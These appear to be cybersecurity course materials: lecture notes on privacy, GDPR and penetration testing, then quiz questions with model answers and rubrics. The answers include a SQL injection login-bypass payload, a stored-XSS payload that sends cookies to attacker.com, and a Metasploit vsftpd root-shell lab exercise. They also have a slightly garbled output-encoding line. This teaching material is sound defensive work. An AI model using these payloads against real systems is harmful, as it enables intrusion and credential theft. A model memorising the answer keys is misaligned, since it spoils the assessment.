Unlike web apps (updated instantly on the server), mobile apps must be updated through app stores and users must install the update. You cannot force users to update, so vulnerable app versions may remain in use for months or years. Design APIs to be backward-compatible and implement server-side version checking to block critically vulnerable app versions.

learning_objectives: Understand key privacy regulations: GDPR, CCPA, HIPAA, and their technical requirements
Apply data minimization, purpose limitation, and privacy by design principles
Implement technical privacy controls: anonymization, pseudonymization, and differential privacy
Conduct a Privacy Impact Assessment (PIA) for a new system
readings: GDPR Articles 5, 25, 32-34 (selected sections on principles, privacy by design, security, breach notification)
NIST Privacy Framework v1.0
Dwork and Roth, 'The Algorithmic Foundations of Differential Privacy', Ch. 1-2

lecture_notes.introduction: Privacy is a fundamental right, and the regulatory landscape around data protection has expanded dramatically. The EU's General Data Protection Regulation (GDPR), California's Consumer Privacy Act (CCPA), and sector-specific regulations like HIPAA (healthcare) impose strict requirements on how organizations collect, process, store, and share personal data. Non-compliance carries severe penalties: GDPR fines can reach 4% of global annual revenue or 20 million euros, whichever is higher. Privacy is not just a legal obligation -- it is a competitive advantage. Users increasingly choose products that respect their privacy, and data breaches erode trust that takes years to rebuild. Privacy by design integrates privacy protections into the system architecture from the beginning, rather than bolting them on after the fact. Technical privacy controls include data minimization (collect only what you need), anonymization (remove identifying information), pseudonymization (replace identifiers with tokens that can only be re-linked with a separate key), and differential privacy (add calibrated noise to query results so individual records cannot be identified). This session covers both the regulatory requirements and the technical tools for building privacy-respecting systems.
key_concepts: GDPR key principles: lawfulness (valid legal basis for processing), purpose limitation (use data only for stated purposes), data minimization (collect only necessary data), accuracy, storage limitation (delete when no longer needed), integrity and confidentiality, accountability (demonstrate compliance)

Data subject rights under GDPR: right to access (see what data is held), right to rectification (correct inaccurate data), right to erasure (right to be forgotten), right to data portability (receive data in machine-readable format), right to object to processing, right not to be subject to automated decision-making

Privacy by design: embed privacy into the design and architecture of systems from the start; seven principles: proactive (prevent problems), default (privacy-protective settings as default), embedded (built into design), positive-sum (full functionality without sacrificing privacy), end-to-end (protect through entire data lifecycle), visibility (transparent and verifiable), user-centric (respect user interests)

Anonymization: remove all identifying information so that individuals cannot be re-identified; true anonymization is very difficult -- naive approaches (removing names) are defeated by quasi-identifiers (zip code + age + gender can re-identify 87% of US population per Sweeney 2000)

Pseudonymization: replace identifiers with tokens; the mapping between tokens and identifiers is stored separately with restricted access; data remains personal data under GDPR (because it can be re-identified with the mapping) but carries reduced risk

k-anonymity: ensure each record is indistinguishable from at least k-1 other records based on quasi-identifiers; provides a quantitative privacy guarantee but is vulnerable to homogeneity attacks (all k records have the same sensitive value) and background knowledge attacks

Differential privacy: add calibrated random noise to query results so that the presence or absence of any individual record has minimal effect on the output; provides a mathematical privacy guarantee (epsilon parameter controls the privacy-utility trade-off); used by Apple, Google, and the US Census

Data Protection Impact Assessment (DPIA): required by GDPR for high-risk processing; systematically identify and minimize privacy risks; assess: what data is collected, what is the legal basis, who has access, how long is it retained, what are the risks to data subjects, what safeguards are implemented

Privacy engineering in practice: minimize data collection (do you really need the date of birth, or just the age range?), encrypt sensitive fields, implement access controls on personal data, automate data deletion when retention periods expire, provide self-service data export and deletion for users
lecture_notes.demonstration: Conduct a Privacy Impact Assessment for a hypothetical employee wellness application that collects health data, activity data, and location data. (1) Map data flows: what data is collected, where it is stored, who can access it, and how long it is retained. (2) Identify privacy risks: health data combined with location could reveal visits to medical facilities; activity data could be used for performance evaluation rather than wellness. (3) Apply GDPR requirements: identify the legal basis (consent, given the employer-employee power imbalance, may not be freely given), data minimization opportunities (aggregate activity data instead of detailed GPS tracks), and retention limits. (4) Implement technical controls: pseudonymize employee identifiers before sharing with the wellness provider, aggregate health statistics so individual conditions cannot be identified, implement differential privacy for reporting. (5) Document the assessment and residual risks.
setup_requirements: Differential privacy demonstration in Python (Google's dp library)

review.value: Amazon: 746 million euros (2021) for processing personal data without proper consent. Meta: 1.2 billion euros (2023) for transferring EU user data to the US without adequate safeguards. British Airways: 20 million pounds (2020) for a data breach affecting 400,000 customers due to poor security controls. These fines demonstrate that regulators enforce GDPR aggressively.

Imagine a database of medical records. You want to know 'What percentage of people have diabetes?' without revealing any individual's status. Differential privacy adds random noise to the answer: the true answer is 8.3%, but the reported answer might be 8.1% or 8.5%. The noise is calibrated so that adding or removing any single person's record changes the answer by at most a small amount (controlled by epsilon). Smaller epsilon = more privacy but noisier answers.

Implementing erasure is technically challenging: data may be in production databases, backups, analytics pipelines, ML training data, and third-party systems. A practical approach: (1) centralize personal data references through an identity service, (2) use soft deletion with a grace period, (3) exclude deleted users from backup restores, (4) document which systems require manual erasure and establish procedures.

Privacy and security are related but distinct. Security protects data from unauthorized access (confidentiality). Privacy protects individuals from misuse of their data even by authorized parties. A system can be perfectly secure (no unauthorized access) but privacy-violating (the company uses customer data for purposes the customer did not consent to). Both are necessary.

class_schedule.topic: Security Auditing and Penetration Testing Introduction
learning_objectives: Conduct a structured penetration test following a professional methodology
Use reconnaissance, scanning, and exploitation tools responsibly
Write a professional security assessment report with findings, severity ratings, and remediation recommendations
Understand the legal and ethical boundaries of security testing
readings: Weidman, 'Penetration Testing: A Hands-On Introduction to Hacking', Ch. 1-6
PTES (Penetration Testing Execution Standard) v1.1
OWASP Testing Guide v4 -- Methodology

lecture_notes.introduction: Penetration testing is authorized simulated attacking to find vulnerabilities before real attackers do. It is the ultimate validation of security controls: instead of asking 'are our defenses configured correctly?' (which an audit answers), a penetration test asks 'can an attacker actually break in?' (which only testing can answer). A structured methodology ensures comprehensive coverage and reproducible results. The penetration testing process follows phases: pre-engagement (scope, rules of engagement, authorization), reconnaissance (gathering information about the target), scanning (identifying live hosts, open ports, and running services), exploitation (attempting to compromise systems using identified vulnerabilities), post-exploitation (determining the impact of successful compromises), and reporting (documenting findings with severity ratings and remediation recommendations). The report is as important as the testing itself -- vulnerabilities found but not clearly communicated are vulnerabilities that remain unfixed. This session provides a hands-on introduction to penetration testing methodology and tools, emphasizing both the technical skills and the professional and ethical responsibilities of a security tester.
key_concepts: Rules of engagement: written authorization specifying scope (which systems can be tested), timing (testing hours, blackout periods), allowed techniques (social engineering yes/no, DoS testing yes/no), communication channels (who to contact if a critical vulnerability is found), and emergency procedures (what to do if testing causes an outage)

Reconnaissance (OSINT): gather publicly available information about the target; techniques include DNS enumeration (discovering subdomains), WHOIS lookup (registration information), Google dorking (finding exposed files and login pages), social media analysis, certificate transparency logs, and Shodan (internet-connected device search)

Active scanning: Nmap for port scanning and service detection (nmap -sV -sC target), vulnerability scanning with Nessus or OpenVAS, web application scanning with Nikto or OWASP ZAP; scanning generates network traffic and may be detected -- coordinate with the client

Nmap scan types: SYN scan (-sS, stealthy, does not complete TCP handshake), version detection (-sV, identifies running services and versions), script scan (-sC, runs default NSE scripts for common vulnerabilities), OS detection (-O), and comprehensive scan (-A combines -sV -sC -O --traceroute)

Exploitation: using identified vulnerabilities to gain access; Metasploit framework provides exploit modules, payloads, and post-exploitation tools; always verify exploits in a lab before using them on client systems; document every action for the report

Post-exploitation: after gaining access, determine the real-world impact; attempt privilege escalation (user to root/admin), lateral movement (compromised machine to other machines), data access (can you reach sensitive data?), and persistence (could an attacker maintain long-term access?)

CVSS scoring: Common Vulnerability Scoring System rates vulnerabilities 0-10 based on attack vector, attack complexity, privileges required, user interaction, scope, and impact (confidentiality, integrity, availability); Critical (9.0-10.0), High (7.0-8.9), Medium (4.0-6.9), Low (0.1-3.9)

Security assessment report: executive summary (business-language overview for leadership), methodology (what was tested and how), findings (each vulnerability with description, evidence, severity, and remediation), risk ratings (CVSS or custom), and remediation roadmap (prioritized action plan)

Responsible disclosure: if vulnerabilities are found in third-party products, follow responsible disclosure practices -- notify the vendor privately, allow a reasonable time to patch (typically 90 days), then disclose publicly to motivate patching; CVE (Common Vulnerabilities and Exposures) provides standardized vulnerability identifiers
lecture_notes.demonstration: Conduct a guided penetration test against a vulnerable lab environment (Metasploitable VM): (1) Reconnaissance: use Nmap to discover the target, scan all ports, and identify running services (vsftpd 2.3.4, Apache, MySQL, Samba). (2) Vulnerability identification: research identified services for known vulnerabilities -- find that vsftpd 2.3.4 has a backdoor (CVE-2011-2523). (3) Exploitation: use Metasploit to exploit the vsftpd backdoor and gain a root shell. (4) Post-exploitation: enumerate users, access the MySQL database, extract password hashes. (5) Write a finding report for the vsftpd vulnerability with CVSS score (9.8 Critical), evidence (screenshots of exploitation), and remediation (update vsftpd to latest version, remove the backdoor version).
setup_requirements: Kali Linux VM with Nmap, Metasploit, and other tools
Isolated lab network (no internet access for the target)

review.value: A penetration test without written authorization is a crime under the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalent laws worldwide. The scope, timing, techniques, and emergency contacts must be agreed upon in writing before any testing begins. Even scanning without authorization can be illegal. Always get a signed statement of work.

Many organizations run bug bounty programs (HackerOne, Bugcrowd) that authorize security researchers to find and report vulnerabilities in exchange for rewards. These programs define scope (which assets are in scope), rules (no social engineering, no DoS), and reward tiers (from $100 for low severity to $100,000+ for critical). Bug bounties are an excellent way to practice penetration testing legally.

A vulnerability finding is only useful if it is clearly communicated. A good finding includes: a descriptive title, the affected system and component, steps to reproduce the vulnerability, evidence (screenshots, request/response pairs), business impact (what an attacker could do), CVSS score with vector string, and specific remediation steps. Avoid vague recommendations like 'improve security.'

Automated scanners (Nessus, Burp Suite Scanner) find known vulnerabilities quickly but miss business logic flaws and chained attacks. Manual testing finds creative attack paths but is slow and depends on tester skill. The best approach combines both: automated scanning for broad coverage, manual testing for depth and business logic.

learning_objectives: Synthesize all cybersecurity topics into a comprehensive security strategy for a real-world organization
Apply the defense-in-depth principle across all layers: network, application, data, and human
Understand cybersecurity career paths: security engineering, penetration testing, incident response, GRC, and security architecture
Prepare for industry certifications: CompTIA Security+, CEH, OSCP, CISSP
readings: Review all course materials
Krebs on Security blog -- selected recent articles
NIST Cybersecurity Framework v2.0 -- complete

lecture_notes.introduction: This final session synthesizes everything we have covered into a coherent security strategy and looks ahead to cybersecurity careers. Security is not a checklist of individual controls -- it is a holistic discipline that requires understanding how cryptography, authentication, network security, application security, incident response, and privacy work together to protect an organization. A strong security posture requires technical controls (firewalls, encryption, secure coding), administrative controls (policies, training, incident response plans), and physical controls (access badges, locked server rooms, secure disposal) working in concert. No single control is sufficient; defense in depth ensures that the failure of any single control does not result in a complete compromise. The cybersecurity field offers diverse career paths with strong demand and competitive compensation. Security engineers build secure systems, penetration testers find vulnerabilities, incident responders handle breaches, GRC (Governance Risk Compliance) professionals manage regulatory requirements, and security architects design organization-wide security strategies. Industry certifications (CompTIA Security+, OSCP, CISSP) validate knowledge and open career doors. This session reviews the key concepts from every topic, presents a comprehensive security case study, and provides guidance for continuing your security education and career.
key_concepts: Security strategy layers: people (security awareness training, social engineering defense), process (policies, procedures, incident response plans), technology (cryptography, firewalls, IDS, secure coding); all three are necessary -- technology alone cannot defend against phishing or insider threats

Course synthesis: CIA triad (week 1) provides the framework; threat modeling (week 2) identifies risks; cryptography (weeks 3-4) protects confidentiality and integrity; authentication (week 5) controls access; network security (week 6) protects the perimeter; web and software security (weeks 7-8) protect applications; malware and IDS (week 9) detect threats; incident response (week 10) handles breaches; cloud and mobile security (weeks 11-12) extend defenses to modern platforms; privacy (week 13) protects individuals; penetration testing (week 14) validates everything

NIST Cybersecurity Framework functions: Identify (asset management, risk assessment), Protect (access control, awareness training, data security), Detect (anomaly detection, continuous monitoring), Respond (response planning, communications, mitigation), Recover (recovery planning, improvements); a complete security program addresses all five functions

Security maturity model: Level 1 (Initial -- ad hoc, reactive), Level 2 (Managed -- basic controls, some policies), Level 3 (Defined -- documented processes, consistent implementation), Level 4 (Quantitatively Managed -- metrics-driven, continuous monitoring), Level 5 (Optimizing -- continuous improvement, threat intelligence-driven); most organizations are at Level 2-3

Security metrics: mean time to detect (MTTD), mean time to respond (MTTR), vulnerability remediation time, phishing click rate, patch compliance rate, percentage of systems with MFA; metrics enable data-driven security decisions and demonstrate improvement over time

Career paths: Security Engineer (build secure systems, $120-180K), Penetration Tester (find vulnerabilities, $100-160K), Incident Responder (handle breaches, $110-170K), Security Architect (design security strategy, $150-220K), CISO (lead security organization, $200-400K), GRC Analyst (compliance and risk, $90-140K)

Certifications roadmap: entry level -- CompTIA Security+ (broad foundation), mid-level -- CEH (ethical hacking), GIAC (specialized technical), CySA+ (analyst), advanced -- OSCP (hands-on penetration testing), CISSP (security management), CISM (security governance)

Continuing education: CTF competitions (HackTheBox, TryHackMe, picoCTF), bug bounty programs (HackerOne, Bugcrowd), security conferences (DEF CON, Black Hat, BSides), security blogs and podcasts (Krebs on Security, Darknet Diaries), open-source security tools contribution

Emerging threats: AI-powered attacks (automated phishing, deepfakes for social engineering), supply chain attacks (compromising widely-used libraries and build systems), quantum computing threats to current cryptography, IoT security (billions of devices with minimal security), and ransomware evolution (double extortion -- encrypt and exfiltrate)
lecture_notes.demonstration: Comprehensive case study: design a security strategy for a mid-size healthcare company (500 employees, patient portal, EHR system, telehealth platform). Students work in groups to: (1) Identify critical assets and data flows (patient health records, billing data, prescription information). (2) Perform a high-level threat model (HIPAA requirements, ransomware threat to healthcare, insider threats from staff with broad access). (3) Design layered defenses: network segmentation separating clinical from administrative systems, encryption for PHI at rest and in transit, MFA for all clinical system access, web application security for the patient portal, endpoint detection for workstations, backup strategy resistant to ransomware. (4) Plan incident response: HIPAA breach notification requirements (60 days), forensic readiness, and communication plan. (5) Present and defend their strategy to the class.
setup_requirements: Case study materials and organizational profile

review.key: Security Is a Process Not a Product
review.value: Security is not achieved by buying a firewall or hiring a penetration tester. It is a continuous process of identifying risks, implementing controls, monitoring for threats, responding to incidents, and learning from failures. The threat landscape evolves constantly, and defenses must evolve with it. An organization that was secure last year may not be secure today.

Verizon's Data Breach Investigations Report consistently finds that 74% of breaches involve the human element: social engineering, errors, or misuse. Technical controls alone cannot defend against an employee who clicks a phishing link and enters their credentials. Security awareness training, phishing simulations, and a culture where reporting suspicious activity is encouraged are essential.

For the healthcare case study: network firewall (perimeter) + network segmentation (internal) + WAF (application perimeter) + parameterized queries (application code) + database encryption (data) + access logging (detection) + backup (recovery). An attacker must bypass ALL layers to exfiltrate patient data. Each layer makes the attack harder and more likely to be detected.

Build a home lab (VMs, vulnerable apps, network equipment). Earn CompTIA Security+. Practice on HackTheBox and TryHackMe. Participate in CTF competitions. Read security advisories and try to understand the vulnerabilities. Contribute to open-source security tools. Network with the security community at local BSides conferences. The field values demonstrated skill over formal credentials.

questions.question: Explain the difference between symmetric and asymmetric encryption. Why are both needed in TLS? Describe the TLS 1.3 handshake at a high level.
questions.answer:
Symmetric encryption (AES) uses one shared key for encryption and decryption -- fast (GB/s) but requires secure key exchange. Asymmetric encryption (RSA/ECC) uses a public/private key pair -- slow (KB/s) but enables key exchange without a shared secret.

TLS needs both: (1) Client sends ClientHello with supported algorithms and ECDH key share. (2) Server responds with ServerHello, its ECDH key share, and its certificate signed by a CA. (3) Both compute a shared secret via ECDHE. (4) All subsequent data encrypted with AES-GCM using the shared secret. Asymmetric crypto (ECDHE) establishes the shared secret; symmetric crypto (AES) protects the bulk data because it is 1000x faster.

rubric.key: Correctly defines both encryption types with trade-offs
Explains why both are needed in TLS (speed + key exchange)
Describes TLS 1.3 handshake steps accurately

questions.question: A company stores user passwords as SHA-256 hashes without salt. Explain three reasons why this is insecure and what they should use instead.
questions.answer:
Three reasons SHA-256 is insecure for passwords:
1. Speed: SHA-256 is fast by design -- GPUs compute 10 billion hashes/second. An 8-character password (62^8 = 218T combinations) falls in 6 hours.
2. No salt: identical passwords produce identical hashes, enabling rainbow table attacks (precomputed hash-to-password lookup tables) that crack millions of passwords instantly.
3. Not memory-hard: SHA-256 uses minimal memory, allowing massive parallelism on GPUs and ASICs.

They should use Argon2 (winner of the Password Hashing Competition) with: a unique random salt per password (16+ bytes), a time cost tuned to ~250ms on the server, and a memory cost of 64MB+ to resist GPU attacks. bcrypt (cost factor 12+) and scrypt are also acceptable alternatives. The output includes the algorithm, salt, and cost parameters alongside the hash for verification.

rubric.key: Explains SHA-256 is too fast for passwords with specific numbers
Explains rainbow table vulnerability from missing salt
Recommends bcrypt/scrypt/Argon2 with specific parameters

questions.question: Describe the STRIDE threat model. For a REST API that accepts user-uploaded files and stores them in cloud storage, identify one threat per STRIDE category and propose a mitigation for each.
questions.answer:
STRIDE applied to a file upload API:

Spoofing: An attacker sends requests pretending to be an authenticated user. Mitigation: JWT token authentication with signature verification on every request.

Tampering: Uploaded file content is modified in transit. Mitigation: require HTTPS (TLS) for all API communication; verify file checksums.

Repudiation: A user denies uploading a malicious file. Mitigation: comprehensive audit logging with user identity, timestamp, file hash, and IP address.

Information Disclosure: Error messages expose internal cloud storage bucket names. Mitigation: return generic error messages; log detailed errors server-side only.

Denial of Service: Attacker uploads extremely large files exhausting storage and bandwidth. Mitigation: file size limits, rate limiting per user, and storage quotas.

Elevation of Privilege: Attacker uploads a web shell (executable file) that the server executes. Mitigation: validate file types (allowlist), store uploads outside the web root, scan uploads for malware, and set Content-Disposition headers to prevent execution.

rubric.key: Correct description of all six STRIDE categories
Valid threat identified for each category in context
Appropriate mitigation for each threat

quizzes.topic: Authentication, Network Security, and Web Security

questions.question: Write a SQL injection payload that would bypass the following login query: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'. Then write the parameterized query version that prevents this attack. Explain why parameterized queries are immune to injection.
questions.answer:
Injection payload: username = ' OR '1'='1' --
Resulting query: SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='...'
The OR '1'='1' is always true, and -- comments out the password check, returning all users.

Parameterized version (Python):
cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (username, password))

Why immune: the database driver treats parameters as data values, not SQL code. Even if the username contains SQL syntax like ' OR '1'='1' --, the driver sends it as a literal string value for comparison. The SQL structure (SELECT ... WHERE ... AND ...) is fixed at compile time and cannot be altered by parameter values. The attacker's SQL code is compared as a string against the username column, which will not match any real username.

rubric.key: Valid SQL injection payload that bypasses login
Correct explanation of why the payload works
Correct parameterized query syntax
Explains separation of code and data in parameterized queries

questions.question: Explain the OAuth 2.0 authorization code flow with PKCE step by step (at least 5 steps). Why is PKCE essential for mobile applications?
questions.answer:
Authorization Code Flow with PKCE:
1. Client generates a random code_verifier and computes code_challenge = SHA256(code_verifier).
2. Client redirects user to authorization server with client_id, redirect_uri, scope, state, code_challenge, and code_challenge_method=S256.
3. User authenticates with the authorization server (login page) and consents to the requested permissions.
4. Authorization server redirects back to the client's redirect_uri with an authorization code and the original state parameter.
5. Client sends the authorization code plus the original code_verifier to the token endpoint.
6. Authorization server verifies code_verifier matches the original code_challenge, then returns access_token, refresh_token, and id_token.
7. Client uses the access_token to call the API.

PKCE is essential for mobile apps because they are 'public clients' -- they cannot securely store a client_secret (the app binary can be decompiled to extract it). Without PKCE, an attacker who intercepts the authorization code (via a malicious app registered for the same redirect URI scheme) could exchange it for tokens. PKCE ensures only the client that initiated the flow (the one that knows the code_verifier) can complete it.

rubric.key: Correct step-by-step flow with at least 5 steps
Explains PKCE purpose for public clients
Explains authorization code interception risk without PKCE

questions.question: A firewall has the following rules (evaluated in order): (1) Allow TCP 80,443 from any to 10.0.1.5, (2) Allow TCP 22 from 10.0.2.0/24 to 10.0.1.0/24, (3) Deny all. Which of the following are allowed? (a) HTTP from internet to 10.0.1.5, (b) SSH from 10.0.2.10 to 10.0.1.20, (c) SSH from internet to 10.0.1.5, (d) HTTP from 10.0.2.10 to 10.0.1.10.
questions.answer:
(a) HTTP (port 80) from internet to 10.0.1.5: ALLOWED by rule 1 (any source to 10.0.1.5 on port 80).

(b) SSH (port 22) from 10.0.2.10 to 10.0.1.20: ALLOWED by rule 2 (10.0.2.10 is in 10.0.2.0/24, 10.0.1.20 is in 10.0.1.0/24).

(c) SSH from internet to 10.0.1.5: DENIED by rule 3 (default deny). Rule 1 only allows ports 80 and 443. Rule 2 only allows from 10.0.2.0/24. No rule matches SSH from internet.

(d) HTTP from 10.0.2.10 to 10.0.1.10: DENIED by rule 3. Rule 1 only allows traffic to 10.0.1.5 specifically, not the entire 10.0.1.0/24 subnet. Rule 2 only allows SSH (port 22).

rubric.key: Correct answer and reasoning for each scenario

quizzes.topic: Web Security, Software Security, and Malware

questions.question: Explain the three types of XSS (Stored, Reflected, DOM-based). For Stored XSS, write an example payload that steals cookies, and describe three defenses that prevent XSS.
questions.answer:
Three XSS types:
Stored XSS: Malicious script saved in the database (e.g., in a comment), executed when any user views the page. Most dangerous because it affects all visitors.

Reflected XSS: Script embedded in a URL parameter, reflected back in the server's response. Requires tricking a victim into clicking a crafted link.

DOM-based XSS: Client-side JavaScript processes untrusted data (e.g., document.location.hash) and inserts it into the DOM without sanitization. The server never sees the payload.

Stored XSS payload: <script>new Image().src='https://attacker.com/steal?c='+document.cookie;</script>
When any user views the page, their cookies are sent to the attacker's server.

Three defenses:
1. Output encoding: convert < to <, > to >, etc., so the browser renders them as text, not HTML/JS.
2. Content Security Policy (CSP): header Content-Security-Policy: script-src 'self' restricts script execution to same-origin scripts only, blocking injected inline scripts.
3. HttpOnly cookies: Set-Cookie: session=abc123; HttpOnly prevents JavaScript from reading the cookie, making cookie theft via XSS impossible.

rubric.key: Correct description of all three XSS types
Valid cookie-stealing payload
Three effective defenses with correct explanations

questions.question: Explain how a buffer overflow attack works. What are the three main OS-level mitigations (ASLR, DEP, stack canaries), and how does each defend against exploitation?
questions.answer:
Buffer overflow: The attacker provides input exceeding a buffer's allocated size. In a stack buffer overflow, the excess data overwrites adjacent stack memory, including the saved return address. The attacker overwrites the return address with the address of their injected shellcode. When the function returns, execution jumps to the shellcode instead of the legitimate caller.

Mitigations:
1. Stack canaries: The compiler inserts a random value (canary) between local variables and the return address. Before returning, the function checks if the canary was modified. An overflow that reaches the return address must first overwrite the canary, triggering detection and program abort.

2. DEP/NX (Data Execution Prevention): Marks memory pages as either writable or executable, never both. The stack is writable (for variables) but not executable. Even if the attacker overwrites the return address, the injected shellcode on the stack cannot execute. Attackers bypass with ROP (using existing executable code gadgets).

3. ASLR (Address Space Layout Randomization): Randomizes the base addresses of the stack, heap, libraries, and executable on each run. The attacker cannot hardcode addresses in their exploit because they change unpredictably. Reduces reliability of exploitation from ~100% to ~0.01% for 32-bit and effectively zero for 64-bit ASLR.

rubric.key: Correct explanation of buffer overflow mechanism
Correct explanation of stack canaries
Correct explanation of DEP/NX with ROP mention
Correct explanation of ASLR with effectiveness

questions.question: Describe the ransomware attack chain from initial access to ransom demand. What is the single most effective defense against ransomware, and why?
questions.answer:
Ransomware attack chain:
1. Initial access: Phishing email with malicious attachment (macro-enabled document) or exploitation of a public-facing vulnerability.
2. Execution: Macro runs a PowerShell command downloading the ransomware payload.
3. Persistence: Creates a scheduled task or registry run key to survive reboot.
4. Discovery: Enumerates network shares, Active Directory, and connected systems.
5. Lateral movement: Uses stolen credentials (Mimikatz) with PsExec/WMI to spread to other machines.
6. Encryption: Encrypts files with AES-256 (fast), encrypts the AES key with RSA (attacker's public key).
7. Ransom: Displays a ransom note with payment instructions (cryptocurrency) and a deadline.

The single most effective defense is immutable, air-gapped backups. If you can restore all systems from clean backups, you can recover without paying ransom. Backups must be: (1) isolated from the network (air-gapped or immutable cloud storage) so ransomware cannot encrypt them, (2) tested regularly (restore drills), and (3) comprehensive (all critical data and system configurations). No preventive control is 100% effective, but reliable backups make ransomware a nuisance rather than a catastrophe.

rubric.key: Correct and complete attack chain (at least 5 stages)
Identifies backups as most effective defense
Explains why backups must be air-gapped and tested

quizzes.topic: Incident Response, Cloud Security, and Mobile Security

questions.question: List the six phases of the NIST incident response lifecycle. For the containment phase, describe the difference between short-term and long-term containment and give an example of each.
questions.answer:
Six phases: (1) Preparation, (2) Detection and Analysis, (3) Containment, (4) Eradication, (5) Recovery, (6) Post-Incident Activity (Lessons Learned).

Short-term containment: Immediate actions to stop the attack from spreading, minimizing changes to the affected system to preserve evidence. Example: isolating the compromised server from the network by disabling its network interface or moving it to a quarantine VLAN. The server remains powered on for forensic evidence collection.

Long-term containment: More thorough measures applied after evidence is preserved, preparing for eradication and recovery. Example: patching the exploited vulnerability on all systems, resetting all potentially compromised credentials, deploying additional monitoring on similar systems, and rebuilding the compromised server from a clean image while maintaining the original for forensic analysis.

rubric.key: All six phases listed correctly
Clear distinction between short-term and long-term containment
Valid examples for each with explanation

questions.question: Explain the shared responsibility model for cloud security. For AWS, which security responsibilities belong to the customer vs the provider for: (a) IaaS (EC2), (b) PaaS (Lambda), (c) SaaS (S3)?
questions.answer:
Shared responsibility: the cloud provider secures the infrastructure 'of' the cloud; the customer secures what they put 'in' the cloud. The boundary shifts depending on the service model.

(a) EC2 (IaaS): Customer responsible for: OS patching, application security, network configuration (security groups), data encryption, IAM policies, firewall rules. AWS responsible for: physical hardware, hypervisor, network fabric, facility security.

(b) Lambda (PaaS): Customer responsible for: function code security (input validation, dependency vulnerabilities), IAM execution role permissions, environment variable management. AWS responsible for: OS, runtime environment, scaling, patching, compute isolation.

(c) S3 (SaaS-like storage): Customer responsible for: bucket policies and ACLs (public access settings), data encryption configuration, IAM policies controlling who can access objects. AWS responsible for: storage infrastructure, durability, availability, physical security.

Key insight: as you move from IaaS to PaaS to SaaS, more responsibility shifts to the provider, but the customer always remains responsible for data, access control, and configuration.

rubric.key: Correct shared responsibility model explanation
Correct customer vs provider responsibilities for each service
Notes the shifting boundary across service models

questions.question: A mobile banking app stores the user's session token in Android SharedPreferences. Explain why this is insecure, what the attacker would need to exploit it, and what secure alternative should be used.
questions.answer:
Why insecure: SharedPreferences stores data as plaintext XML files in the app's private directory (/data/data/com.app/shared_prefs/). While Android sandboxing normally prevents other apps from reading this, the data is exposed when: (1) the device is rooted (common on Android), (2) the device is connected via ADB with USB debugging enabled, (3) the app data is included in a device backup (adb backup), or (4) another app exploits a local privilege escalation vulnerability.

What attacker needs: physical access to the device + USB debugging enabled, or root access (via malware or intentional rooting), or access to an unencrypted device backup.

Secure alternative: Use Android Keystore + EncryptedSharedPreferences. The Android Keystore stores cryptographic keys in hardware-backed secure storage (TEE/StrongBox) that cannot be extracted even on rooted devices. EncryptedSharedPreferences uses a Keystore-backed key to encrypt all stored values with AES-256-GCM. Even if the attacker accesses the file, the encrypted token is useless without the hardware-protected key.

rubric.key: Explains SharedPreferences plaintext storage vulnerability
Identifies realistic attack scenarios
Recommends Keystore + EncryptedSharedPreferences with explanation

quizzes.topic: Privacy, Penetration Testing, and Comprehensive Security

questions.question: Under GDPR, what must an organization do within 72 hours of discovering a personal data breach? List four specific pieces of information that must be included in the notification to the supervisory authority.
questions.answer:
Within 72 hours of becoming aware of a personal data breach involving personal data, the organization must notify the relevant supervisory authority (e.g., the ICO in the UK, CNIL in France). If notification is not made within 72 hours, the organization must provide reasons for the delay.

The notification must include:
1. The nature of the breach: what type of breach occurred (unauthorized access, data loss, alteration), what categories of personal data were affected (names, email addresses, financial data, health data), and whether the data was encrypted.
2. The approximate number of data subjects affected and the approximate number of personal data records concerned.
3. The likely consequences: what harm could result from the breach for affected individuals (identity theft, financial fraud, discrimination, reputational damage).
4. The measures taken or proposed to address the breach: what the organization has done to contain the breach and mitigate its effects (system isolation, password resets, enhanced monitoring, credit monitoring offered to affected individuals).

If the breach is likely to result in high risk to individuals, the organization must also notify the affected individuals directly without undue delay.

rubric.key: Correct 72-hour notification requirement
Four required notification elements correctly described
Mentions individual notification for high-risk breaches

questions.question: You discover a critical SQL injection vulnerability during a penetration test. The CVSS v3 vector is AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H. Calculate the severity rating and explain what each component means.
questions.answer:
CVSS v3 components:
AV:N (Attack Vector: Network) -- exploitable remotely over the internet, no physical access needed.
AC:L (Attack Complexity: Low) -- no special conditions needed; the attack can be reliably reproduced.
PR:N (Privileges Required: None) -- no authentication needed to exploit; any anonymous user can attack.
UI:N (User Interaction: None) -- no victim action required; the attacker can exploit it unilaterally.
S:C (Scope: Changed) -- the vulnerability in one component impacts resources beyond its security scope (e.g., SQL injection in the web app gives access to the database server).
C:H (Confidentiality Impact: High) -- total loss of confidentiality; all data in the database can be read.
I:H (Integrity Impact: High) -- total loss of integrity; data can be modified or deleted.
A:H (Availability Impact: High) -- total loss of availability; the database can be dropped or the server crashed.

This vector produces a CVSS score of 10.0 -- Critical severity. This is the maximum possible score, indicating a remotely exploitable vulnerability requiring no authentication or user interaction that gives complete control over the affected system. Immediate remediation is required.

rubric.key: Correct explanation of each CVSS component
Correct severity rating (10.0 Critical)
Appropriate urgency assessment

questions.question: Design a defense-in-depth strategy for protecting a customer database containing 1 million records. List at least 5 specific security controls across different layers (network, application, data, monitoring, recovery).
questions.answer:
Defense-in-depth for customer database:

1. Network layer: Place the database in a private subnet with no direct internet access. Firewall rules allow connections only from the application server on the database port (e.g., PostgreSQL 5432). No SSH access except from a bastion host in the management network.

2. Application layer: Use parameterized queries exclusively (prevent SQL injection). Implement an ORM or query builder that enforces parameterization. Input validation on all user-facing endpoints. Rate limiting on API endpoints that query the database.

3. Authentication/Authorization: Database credentials rotated quarterly using a secrets manager (not hardcoded). Application connects with a service account that has only SELECT/INSERT/UPDATE permissions -- no DROP, ALTER, or GRANT. Row-level security ensures each customer can only access their own records.

4. Data protection: Encrypt data at rest (AES-256, managed by the cloud provider's KMS). Encrypt in transit (TLS between application and database). Mask or tokenize sensitive fields (SSN, credit card numbers) in non-production environments.

5. Monitoring and detection: Enable database audit logging (all queries by privileged users, all failed login attempts, all schema changes). Alert on unusual query patterns (mass SELECT, new tables accessed, queries at unusual hours). SIEM correlation for database events.

6. Recovery: Daily encrypted backups stored in a separate account/region. Backups are immutable (cannot be deleted for 30 days). Monthly backup restore tests verify recovery works. Point-in-time recovery enabled for the last 7 days.

rubric.key: At least 5 controls across different layers
